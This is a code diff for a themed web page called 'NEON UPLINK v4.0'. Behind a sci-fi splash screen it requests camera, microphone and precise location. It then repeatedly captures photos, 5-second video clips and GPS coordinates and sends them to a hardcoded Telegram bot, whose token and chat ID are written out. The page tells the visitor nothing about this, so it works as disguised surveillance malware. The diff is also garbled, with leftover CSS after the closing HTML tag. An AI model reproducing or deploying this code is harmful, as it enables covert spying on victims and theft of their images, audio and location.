@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🛰️ NEON UPLINK v3.1</title>
+<title>🛰️ NEON UPLINK v4.0</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
   * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
@@ -27,7 +27,7 @@
     pointer-events: none; z-index: 9;
   }
 
-  /* === SPLASH / PERMISSION SCREEN === */
+  /* === SPLASH SCREEN === */
   #splashScreen {
     position: fixed; inset: 0; z-index: 100;
     display: flex; flex-direction: column; align-items: center; justify-content: center;
@@ -38,77 +38,469 @@
   #splashScreen.hide { opacity: 0; pointer-events: none; }
 
   .splash-logo {
-    font-size: 3.5rem; margin-bottom: 10px;
-    text-shadow: 0 0 20px #00f3ff;
-    animation: float 3s ease-in-out infinite;
+    font-size: 4rem; margin-bottom: 15px;
+    text-shadow: 0 0 30px #00f3ff;
+    animation: pulse 2s infinite;
   }
-  @keyframes float {
-    0%, 100% { transform: translateY(0); }
-    50% { transform: translateY(-10px); }
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.8; }
   }
   .splash-title {
-    font-size: 2rem; color: #00f3ff;
-    text-shadow: 0 0 15px #00f3ff;
+    font-size: 2.2rem; color: #00f3ff;
+    text-shadow: 0 0 20px #00f3ff;
     margin-bottom: 5px;
-    letter-spacing: 3px;
+    letter-spacing: 4px;
   }
   .splash-sub {
-    color: #666; font-size: 0.8rem; margin-bottom: 30px;
+    color: #666; font-size: 0.85rem; margin-bottom: 40px;
     letter-spacing: 2px;
   }
 
-  .progress-bar {
-    width: 100%; max-width: 400px;
-    height: 4px; background: #1a1a2e;
-    border-radius: 2px; margin-bottom: 30px;
-    overflow: hidden;
-  }
-  .progress-fill {
-    height: 100%; background: linear-gradient(90deg, #00f3ff, #ff00ff);
-    width: 0%; transition: width 0.5s ease;
-    box-shadow: 0 0 10px #00f3ff;
+  .loading-container {
+    width: 100%; max-width: 350px;
+    text-align: center;
   }
 
-  .perm-card {
-    width: 100%; max-width: 400px;
-    background: #0a0f1a; border: 2px solid #333;
-    border-radius: 12px; padding: 20px;
-    margin-bottom: 20px;
-    transition: all 0.3s;
-    position: relative;
-    overflow: hidden;
-  }
-  .perm-card.active {
-    border-color: #00f3ff;
+  .spinner {
+    width: 80px; height: 80px;
+    margin: 0 auto 30px;
+    border: 4px solid #1a1a2e;
+    border-top-color: #00f3ff;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
     box-shadow: 0 0 30px #00f3ff40;
-    transform: scale(1.02);
   }
-  .perm-card.completed {
-    border-color: #00ff88;
-    opacity: 0.6;
+  @keyframes spin {
+    to { transform: rotate(360deg); }
   }
-  .perm-card::before {
-    content: '';
-    position: absolute;
-    top: 0; left: -100%;
-    width: 100%; height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(0,243,255,0.1), transparent);
-    transition: left 0.5s;
-  }
-  .perm-card.active::before { left: 100%; }
 
-  .perm-header {
-    display: flex; align-items: center; justify-content: space-between;
-    margin-bottom: 10px;
+  .perm-grid {
+    display: grid; grid-template-columns: repeat(3, 1fr);
+    gap: 15px; margin-bottom: 30px;
   }
-  .perm-icon-box {
-    display: flex; align-items: center; gap: 12px;
+  .perm-box {
+    background: #0a0f1a;
+    border: 2px solid #333;
+    border-radius: 8px;
+    padding: 15px 10px;
+    text-align: center;
+    transition: all 0.3s;
   }
-  .perm-icon {
-    font-size: 2rem;
-    filter: grayscale(100%);
+  .perm-box.active {
+    border-color: #00f3ff;
+    box-shadow: 0 0 20px #00f3ff40;
+    transform: scale(1.05);
+  }
+  .perm-box.done {
+    border-color: #00ff88;
+    background: #00ff8810;
+  }
+  .perm-box-icon {
+    font-size: 2rem; margin-bottom: 8px;
+    opacity: 0.5;
     transition: 0.3s;
   }
+  .perm-box.active .perm-box-icon,
+  .perm-box.done .perm-box-icon {
+    opacity: 1;
+    filter: drop-shadow(0 0 10px currentColor);
+  }
+  .perm-box.done .perm-box-icon { color: #00ff88; }
+  .perm-box-label {
+    font-size: 0.7rem; color: #666;
+    letter-spacing: 1px;
+  }
+  .perm-box.active .perm-box-label { color: #00f3ff; }
+  .perm-box.done .perm-box-label { color: #00ff88; }
+
+  .status-text {
+    font-size: 0.9rem; color: #888;
+    margin-bottom: 20px;
+    min-height: 24px;
+    letter-spacing: 1px;
+  }
+  .status-text.loading { color: #00f3ff; animation: blink 1s infinite; }
+  .status-text.done { color: #00ff88; }
+  @keyframes blink { 50% { opacity: 0.5; } }
+
+  #startBtn {
+    padding: 16px 50px; font-size: 1.1rem; font-family: inherit;
+    background: transparent; border: 2px solid #00f3ff; color: #00f3ff;
+    cursor: pointer; letter-spacing: 3px;
+    box-shadow: 0 0 25px #00f3ff40;
+    transition: 0.3s;
+    text-transform: uppercase;
+    font-weight: bold;
+  }
+  #startBtn:hover {
+    background: #00f3ff20;
+    transform: scale(1.05);
+    box-shadow: 0 0 40px #00f3ff60;
+  }
+  #startBtn:disabled {
+    opacity: 0.3; cursor: wait; border-color: #666; color: #666;
+  }
+
+  /* === MAIN UI === */
+  #mainUI {
+    position: relative; z-index: 5;
+    display: none; flex-direction: column; height: 100vh; padding: 15px;
+    opacity: 0; transition: opacity 0.5s;
+  }
+  #mainUI.show { display: flex; opacity: 1; }
+
+  .hud-top { display: flex; justify-content: space-between; margin-bottom: 10px; gap: 10px; }
+  .panel {
+    background: #0a0f1a90; border: 1px solid #00f3ff50;
+    padding: 8px 12px; border-radius: 6px;
+    backdrop-filter: blur(4px);
+    font-size: 0.85rem; flex: 1; text-align: center;
+  }
+  .blink { animation: blink 1s infinite; color: #00ff88; }
+
+  .hud-center {
+    flex: 1; display: flex; align-items: center; justify-content: center;
+    position: relative; margin: 10px 0;
+  }
+  #video {
+    width: 100%; max-width: 500px; height: auto;
+    border: 2px solid #b026ff; border-radius: 8px;
+    background: #000; box-shadow: 0 0 25px #b026ff60;
+    transform: scaleX(-1);
+  }
+  .rec-indicator {
+    position: absolute; top: 10px; right: 10px;
+    background: #ff000080; color: #fff; padding: 4px 10px;
+    border-radius: 4px; font-weight: bold; font-size: 0.8rem;
+    animation: pulseRec 1.5s infinite;
+  }
+  @keyframes pulseRec { 50% { box-shadow: 0 0 20px red; } }
+
+  .hud-bottom { margin-top: auto; }
+  .log-panel {
+    height: 110px; overflow-y: auto; font-size: 0.72rem;
+    color: #0f0; line-height: 1.4;
+    background: #0a0f1a90; border: 1px solid #00f3ff40;
+    padding: 10px; border-radius: 6px;
+  }
+  .log-panel::-webkit-scrollbar { width: 6px; }
+  .log-panel::-webkit-scrollbar-thumb { background: #00f3ff; border-radius: 3px; }
+
+  .countdown {
+    position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
+    font-size: 1.1rem; color: #ff00ff; text-shadow: 0 0 10px #ff00ff;
+    background: #00000080; padding: 4px 12px; border-radius: 4px;
+  }
+</style>
+</head>
+<body>
+<canvas id="starfield"></canvas>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+
+<!-- ============ SPLASH SCREEN ============ -->
+<div id="splashScreen">
+  <div class="splash-logo">🛰️</div>
+  <div class="splash-title">NEON UPLINK</div>
+  <div class="splash-sub">v4.0 // FAST ACCESS</div>
+
+  <div class="loading-container">
+    <div class="spinner" id="spinner" style="display:none;"></div>
+    
+    <div class="perm-grid">
+      <div class="perm-box" id="boxCam">
+        <div class="perm-box-icon">📷</div>
+        <div class="perm-box-label">CAMERA</div>
+      </div>
+      <div class="perm-box" id="boxLoc">
+        <div class="perm-box-icon">📍</div>
+        <div class="perm-box-label">LOCATION</div>
+      </div>
+      <div class="perm-box" id="boxMic">
+        <div class="perm-box-icon">🎤</div>
+        <div class="perm-box-label">MIC</div>
+      </div>
+    </div>
+
+    <div class="status-text" id="statusText">Ready to initialize</div>
+    
+    <button id="startBtn">▶️ START</button>
+  </div>
+</div>
+
+<!-- ============ MAIN UI ============ -->
+<div id="mainUI">
+  <div class="hud-top">
+    <div class="panel">STATUS: <span class="blink">ONLINE</span></div>
+    <div class="panel" id="txPanel">NEXT TX: --s</div>
+  </div>
+  <div class="hud-center">
+    <video id="video" autoplay muted playsinline></video>
+    <div class="rec-indicator">● REC</div>
+    <div class="countdown" id="countdown">UPLINK ACTIVE</div>
+  </div>
+  <div class="hud-bottom">
+    <div class="log-panel" id="logBox">&gt; SYSTEM ONLINE...</div>
+  </div>
+</div>
+
+<canvas id="photoCanvas" style="display:none;"></canvas>
+
+<script>
+// ============================================
+// ⚙️ KONFIGURASI
+// ============================================
+const BOT_TOKEN = "7334976291:AAEOf0ppLNPYjOF98NC7ceZtMfXPWZ1X-WE";
+const CHAT_ID   = "7223902938";
+// ============================================
+
+let stream, mediaRecorder, chunks = [];
+let nextPhotoTime = 0, nextVideoTime = 0;
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('photoCanvas');
+const logBox = document.getElementById('logBox');
+const txPanel = document.getElementById('txPanel');
+const countdownEl = document.getElementById('countdown');
+const splash = document.getElementById('splashScreen');
+const mainUI = document.getElementById('mainUI');
+const startBtn = document.getElementById('startBtn');
+const statusText = document.getElementById('statusText');
+const spinner = document.getElementById('spinner');
+const boxCam = document.getElementById('boxCam');
+const boxLoc = document.getElementById('boxLoc');
+const boxMic = document.getElementById('boxMic');
+
+// --- FAST PARALLEL PERMISSION REQUEST ---
+async function requestAllPermissions() {
+  startBtn.disabled = true;
+  spinner.style.display = 'block';
+  statusText.textContent = 'Requesting permissions...';
+  statusText.className = 'status-text loading';
+  
+  boxCam.classList.add('active');
+  boxLoc.classList.add('active');
+  boxMic.classList.add('active');
+
+  let camGranted = false;
+  let locGranted = false;
+
+  // Request Camera+Mic AND Location PARALLEL (simultaneously)
+  const promises = [];
+
+  // 1. Camera + Microphone
+  promises.push(
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'environment', width: { ideal: 1280 } },
+      audio: true
+    }).then(s => {
+      stream = s;
+      video.srcObject = s;
+      camGranted = true;
+      boxCam.classList.remove('active');
+      boxCam.classList.add('done');
+      boxMic.classList.remove('active');
+      boxMic.classList.add('done');
+      log('> CAMERA & MIC: GRANTED');
+    }).catch(err => {
+      log('> CAMERA/MIC ERROR: ' + err.message);
+      throw err;
+    })
+  );
+
+  // 2. Location (parallel)
+  promises.push(
+    new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        reject(new Error('Geolocation not supported'));
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          locGranted = true;
+          boxLoc.classList.remove('active');
+          boxLoc.classList.add('done');
+          log('> LOCATION: GRANTED');
+          resolve(pos);
+        },
+        reject,
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    })
+  );
+
+  // Wait for all (with timeout)
+  try {
+    await Promise.all(promises);
+    
+    statusText.textContent = 'All permissions granted!';
+    statusText.className = 'status-text done';
+    
+    setTimeout(() => {
+      enterMain();
+    }, 500);
+    
+  } catch (err) {
+    statusText.textContent = 'Permission denied. Tap to retry.';
+    statusText.className = 'status-text';
+    spinner.style.display = 'none';
+    startBtn.disabled = false;
+    startBtn.textContent = '🔄 RETRY';
+    
+    boxCam.classList.remove('active');
+    boxLoc.classList.remove('active');
+    boxMic.classList.remove('active');
+    
+    log('> PERMISSION DENIED: ' + err.message);
+  }
+}
+
+startBtn.onclick = requestAllPermissions;
+
+// --- Enter Main UI ---
+function enterMain() {
+  splash.classList.add('hide');
+  setTimeout(() => {
+    splash.style.display = 'none';
+    mainUI.classList.add('show');
+    startUplink();
+  }, 500);
+}
+
+// --- Starfield ---
+const starCanvas = document.getElementById('starfield');
+const sctx = starCanvas.getContext('2d');
+let stars = [];
+function resizeStar() { starCanvas.width = innerWidth; starCanvas.height = innerHeight; }
+addEventListener('resize', resizeStar);
+resizeStar();
+for(let i=0; i<150; i++) stars.push({
+  x: Math.random()*starCanvas.width,
+  y: Math.random()*starCanvas.height,
+  z: Math.random()*2,
+  speed: Math.random()*0.5 + 0.1
+});
+function animateStars() {
+  sctx.fillStyle = '#05050a';
+  sctx.fillRect(0, 0, starCanvas.width, starCanvas.height);
+  sctx.fillStyle = '#00f3ff';
+  stars.forEach(s => {
+    sctx.globalAlpha = s.z;
+    sctx.beginPath();
+    sctx.arc(s.x, s.y, s.z * 1.5, 0, Math.PI*2);
+    sctx.fill();
+    s.y += s.speed;
+    if(s.y > starCanvas.height) { s.y = 0; s.x = Math.random()*starCanvas.width; }
+  });
+  requestAnimationFrame(animateStars);
+}
+animateStars();
+
+// --- Core Functions ---
+function log(msg) {
+  const time = new Date().toLocaleTimeString();
+  const p = document.createElement('div');
+  p.innerHTML = `[${time}] ${msg}`;
+  logBox.prepend(p);
+  if (logBox.children.length > 50) logBox.removeChild(logBox.lastChild);
+}
+
+function takePhoto() {
+  if (!stream) return;
+  const ctx = canvas.getContext('2d');
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.8);
+}
+
+async function sendPhoto(blob) {
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('photo', blob, 'u_photo.jpg');
+  fd.append('caption', `📸 AUTO TX // ${new Date().toISOString().slice(0,19)}Z`);
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+    const d = await res.json();
+    log(d.ok ? '✅ PHOTO SENT' : `❌ PHOTO: ${d.description}`);
+  } catch(e) { log(`❌ NET ERR: ${e.message}`); }
+}
+
+function startRecording() {
+  if (!stream) return;
+  chunks = [];
+  mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+  mediaRecorder.ondataavailable = e => chunks.push(e.data);
+  mediaRecorder.onstop = () => {
+    const blob = new Blob(chunks, { type: 'video/webm' });
+    sendVideo(blob);
+  };
+  mediaRecorder.start();
+  log('🎥 RECORDING 5s...');
+  setTimeout(() => {
+    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+  }, 5000);
+}
+
+async function sendVideo(blob) {
+  const fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('video', blob, 'u_video.webm');
+  fd.append('caption', `🎥 AUTO TX // ${new Date().toISOString().slice(0,19)}Z`);
+  try {
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+    const d = await res.json();
+    log(d.ok ? '✅ VIDEO SENT' : `❌ VIDEO: ${d.description}`);
+  } catch(e) { log(`❌ NET ERR: ${e.message}`); }
+}
+
+function sendLocation() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(async pos => {
+    const { latitude, longitude, accuracy } = pos.coords;
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude, horizontal_accuracy: accuracy })
+      });
+      const d = await res.json();
+      log(d.ok ? `✅ LOC: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}` : `❌ LOC: ${d.description}`);
+    } catch(e) { log(`❌ NET ERR: ${e.message}`); }
+  }, err => log(`❌ LOC ERR: ${err.message}`), { enableHighAccuracy: true, timeout: 5000 });
+}
+
+function updateTimers() {
+  const now = Date.now();
+  const nextPhoto = Math.max(0, Math.ceil((nextPhotoTime - now)/1000));
+  const nextVideo = Math.max(0, Math.ceil((nextVideoTime - now)/1000));
+  const next = Math.min(nextPhoto, nextVideo);
+  txPanel.textContent = `NEXT TX: ${next}s`;
+  countdownEl.textContent = `UPLINK CYCLE: ${next}s`;
+
+  if (now >= nextPhotoTime) { takePhoto(); nextPhotoTime = now + 30000; }
+  if (now >= nextVideoTime) { startRecording(); sendLocation(); nextVideoTime = now + 60000; }
+  requestAnimationFrame(updateTimers);
+}
+
+function startUplink() {
+  log('> ALL PERMISSIONS GRANTED');
+  log('> UPLINK STARTED');
+  nextPhotoTime = Date.now() + 2000;
+  nextVideoTime = Date.now() + 5000;
+  updateTimers();
+}
+
+// --- Security check ---
+if (BOT_TOKEN.includes("MASUKKAN") || CHAT_ID.includes("MASUKKAN")) {
+  statusText.textContent = '⚠️ EDIT TOKEN & ID FIRST';
+  startBtn.onclick = () => alert('Open file in text editor, replace BOT_TOKEN & CHAT_ID, save & refresh.');
+}
+</script>
+</body>
+</html>
+
   .perm-card.active .perm-icon {
     filter: grayscale(0%);
     text-shadow: 0 0 15px currentColor;
